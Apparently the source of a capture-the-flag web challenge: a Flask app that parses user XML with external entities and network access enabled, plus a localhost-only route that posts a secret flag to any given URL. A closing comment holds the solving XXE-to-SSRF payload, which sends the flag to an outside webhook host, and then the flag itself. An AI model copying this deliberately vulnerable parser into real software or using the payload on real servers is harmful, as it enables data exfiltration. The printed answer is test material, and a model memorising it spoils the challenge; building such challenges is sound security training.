from flask import Flask, request, send_file, render_template 
from lxml import etree 
import requests 
import os 

app = Flask(__name__) 
FLAG = os.environ["FLAG"] 
# if you are reading this file from xxe, kudos to you! You are thinking out of the box! 

@app.route("/") 
def home(): 
    return render_template("index.html") 

@app.route("/share") 
def share(): 
    return render_template('share.html') 

@app.route("/send_xml", methods=["POST"]) 
def send_xml(): 
    xml = request.form["xml"].strip() 
    try: 
        root = etree.XML(xml, etree.XMLParser(no_network=False)) 
        username = root.findtext(".//username") 
        category = root.findtext(".//category") 
        team = root.findtext(".//team") 
        return render_template("user.html", username=username, category=category, team=team) 
    except Exception as e: 
        error_string = "ERROR: " + str(e) 
        return error_string 
    
@app.route("/secret_share", methods=["GET"]) 
def secret_share(): 
    if request.remote_addr != "127.0.0.1": 
        return "FORBIDDEN" 
    else: 
        url = request.args.get("url") 
        requests.post(url, data={"flag:":FLAG}) 
        return "OK" 

if __name__ == "__main__": 
    app.run(host='0.0.0.0')


# <!DOCTYPE root [<!ENTITY test SYSTEM "http://127.0.0.1:5000/secret_share?url=https://webhooksite.net/2d100471-3c20-4a26-acd0-ebcd917edced">]>
# srdnlen{XXE_2_LFI_and_XXE_2_SSRF_GG}